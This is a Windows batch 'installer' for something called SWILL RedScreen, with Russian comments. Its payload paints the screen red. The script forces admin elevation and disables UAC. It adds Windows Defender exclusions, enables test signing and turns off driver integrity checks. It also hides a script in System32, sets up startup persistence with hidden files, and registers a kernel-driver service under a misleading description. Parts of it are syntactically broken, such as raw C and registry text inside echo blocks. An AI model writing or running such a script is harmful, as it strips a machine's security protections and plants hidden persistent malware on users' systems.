@echo off
chcp 65001 >nul
title SWILL RedScreen Installer
color 0C
echo.
echo ====================================================
echo         SWILL REDSCREEN INSTALLER
echo ====================================================
echo.

:: Проверка прав администратора
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [X] Требуются права администратора!
    echo [*] Запуск с повышенными привилегиями...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [+] Права администратора подтверждены
echo.

:: Создание временной директории
set "TEMP_DIR=%SystemRoot%\Temp\SWILL_Install"
if not exist "%TEMP_DIR%" mkdir "%TEMP_DIR%"
cd /d "%TEMP_DIR%"

echo [1/8] Установка Python и зависимостей...
echo.

:: Проверка установленного Python
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Python не найден. Установка Python 3.10...
    
    :: Скачивание Python
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile 'python_installer.exe'"
    
    :: Тихая установка Python
    echo [*] Установка Python...
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    
    :: Обновление PATH
    setx PATH "%PATH%;C:\Python310;C:\Python310\Scripts" /M
) else (
    echo [+] Python уже установлен
)

:: Обновление pip
echo [*] Обновление pip...
python -m pip install --upgrade pip --no-warn-script-location

echo.
echo [2/8] Установка основных библиотек...
echo.

:: Создание requirements.txt
echo [*] Создание файла зависимостей...
(
echo ctypes
echo pywin32==305
echo numpy==1.24.3
echo pygame==2.5.2
) > requirements.txt

:: Установка библиотек
echo [*] Установка библиотек из requirements.txt...
pip install -r requirements.txt --no-warn-script-location

echo.
echo [3/8] Установка дополнительных системных пакетов...
echo.

:: Установка pywin32 пост-инсталляция
echo [*] Настройка pywin32...
python -m pywin32_postinstall -install --quiet

:: Установка дополнительных пакетов
echo [*] Дополнительные пакеты...
pip install comtypes==1.3.0 --no-warn-script-location
pip install wmi==1.5.1 --no-warn-script-location
pip install psutil==5.9.6 --no-warn-script-location

echo.
echo [4/8] Установка компиляторов и инструментов...
echo.

:: Проверка Visual Studio Build Tools
echo [*] Проверка компилятора C++...
where cl >nul 2>&1
if %errorLevel% neq 0 (
    echo [*] Установка Microsoft Visual C++ Build Tools...
    
    :: Создание конфигурационного файла
    (
    echo {
    echo   "version": "1.0",
    echo   "components": [
    echo     "Microsoft.VisualStudio.Component.VC.Tools.x86.x64",
    echo     "Microsoft.VisualStudio.Component.Windows10SDK"
    echo   ]
    echo }
    ) > vs_buildtools.json
    
    :: Скачивание инсталлятора
    powershell -Command "Invoke-WebRequest -Uri 'https://aka.ms/vs/17/release/vs_BuildTools.exe' -OutFile 'vs_BuildTools.exe'"
    
    :: Тихая установка
    echo [*] Установка Build Tools (это может занять время)...
    start /wait vs_BuildTools.exe --quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Component.VC.Tools.x86.x64 --add Microsoft.VisualStudio.Component.Windows10SDk
) else (
    echo [+] Компилятор C++ уже установлен
)

echo.
echo [5/8] Настройка системных переменных...
echo.

:: Добавление Python в PATH для всех пользователей
echo [*] Настройка переменных окружения...
setx PYTHONPATH "C:\Python310\Lib;C:\Python310\DLLs;C:\Python310\Lib\site-packages" /M

:: Добавление Python скриптов в PATH
where python >nul
if %errorLevel% == 0 (
    for /f "tokens=2 delims=:" %%i in ('where python') do (
        set "PYTHON_DIR=%%~dpi"
        setx PATH "%PATH%;%PYTHON_DIR%" /M
    )
)

echo.
echo [6/8] Настройка политик безопасности...
echo.

:: Отключение контроля учетных записей
echo [*] Отключение UAC...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f

:: Отключение Windows Defender для Python процессов
echo [*] Настройка исключений защитника...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Python310'"
powershell -Command "Add-MpPreference -ExclusionProcess 'python.exe'"
powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe'"

:: Разрешение выполнение неподписанных драйверов
echo [*] Разрешение неподписанных драйверов...
bcdedit /set testsigning on >nul 2>&1
bcdedit /set nointegritychecks on >nul 2>&1

echo.
echo [7/8] Копирование файлов и настройка автозапуска...
echo.

:: Копирование Python скрипта
echo [*] Копирование основных файлов...
set "TARGET_DIR=C:\Windows\System32\SWILL"
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: Если скрипт находится в той же папке, копируем его
if exist "redscreen.py" (
    copy "redscreen.py" "%TARGET_DIR%\redscreen.py" >nul
    echo [+] Основной скрипт скопирован
) else (
    echo [*] Создание базового скрипта...
    
    :: Создание простого тестового скрипта
    (
    echo import ctypes
    echo import winreg
    echo import os
    echo.
    echo print\("SWILL RedScreen инициализирован"\)
    echo.
    echo \# Добавление в автозагрузку
    echo key = winreg.OpenKey\(winreg.HKEY_CURRENT_USER,
    echo                      r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    echo                      0, winreg.KEY_SET_VALUE\)
    echo winreg.SetValueEx\(key, "SWILL_RedScreen", 0, winreg.REG_SZ, os.path.abspath\(__file__\)\)
    echo winreg.CloseKey\(key\)
    ) > "%TARGET_DIR%\redscreen.py"
)

:: Создание ярлыка в автозагрузке
echo [*] Создание автозапуска...
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%STARTUP_DIR%" mkdir "%STARTUP_DIR%"

(
echo @echo off
echo python "C:\Windows\System32\SWILL\redscreen.py"
echo exit
) > "%STARTUP_DIR%\SWILL_Startup.bat"

:: Скрытие файлов
attrib +h +s "%TARGET_DIR%"
attrib +h +s "%STARTUP_DIR%\SWILL_Startup.bat"

echo.
echo [8/8] Финальная настройка и проверка...
echo.

:: Проверка установки библиотек
echo [*] Проверка установленных библиотек...
python -c "import ctypes, winreg, numpy, pygame, win32api; print('[+] Все библиотеки загружены успешно')" 2>nul || echo [X] Ошибка загрузки библиотек

:: Создание тестового драйвера
echo [*] Создание тестовых файлов...
(
#include <windows.h>

void CreateRedScreen() {
    HDC hdc = GetDC(0);
    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect);
    
    HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
    FillRect(hdc, &rect, redBrush);
    
    SetTextColor(hdc, RGB(255, 255, 255));
    SetBkMode(hdc, TRANSPARENT);
    
    DrawText(hdc, "SWILL ACTIVE", -1, &rect, DT_CENTER ^ DT_VCENTER ^ DT_SINGLELINE);
    
    ReleaseDC(0, hdc);
    DeleteObject(redBrush);
}
) > "%TARGET_DIR%\test_driver.c"

:: Создание службы для драйвера
echo [*] Настройка служб...
(
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SWILL_Driver]
"Type"=dword:00000001
"Start"=dword:00000003
"ErrorControl"=dword:00000001
"ImagePath"="C:\Windows\System32\drivers\swill.sys"
"DisplayName"="SWILL Kernel Driver"
"Description"="Windows Kernel Mode Driver"
) > "%TEMP_DIR%\swill_driver.reg"

reg import "%TEMP_DIR%\swill_driver.reg" >nul 2>&1

:: Разрешение загрузки неподписанных драйверов
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v "DEVMGR_SHOW_NONPRESENT_DEVICES" /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "ProtectionMode" /t REG_DWORD /d 0 /f

echo.
echo ====================================================
echo           УСТАНОВКА ЗАВЕРШЕНА
echo ====================================================
echo.
echo [+] Все библиотеки установлены
echo [+] Системные настройки применены
echo [+] Автозагрузка настроена
echo [+] Политики безопасности обновлены
echo.
echo [*] Система готова к работе SWILL RedScreen
echo [*] Для активации выполните: python C:\Windows\System32\SWILL\redscreen.py
echo.
echo [ВНИМАНИЕ] Для полной функциональности может потребоваться перезагрузка!
echo.
echo ====================================================
pause

:: Запуск скрипта после установки
echo.
echo [*] Запуск RedScreen скрипта...
start /b python "C:\Windows\System32\SWILL\redscreen.py"

:: Очистка временных файлов
echo [*] Очистка временных файлов...
timeout /t 3 /nobreak >nul
rd /s /q "%TEMP_DIR%" 2>nul

exit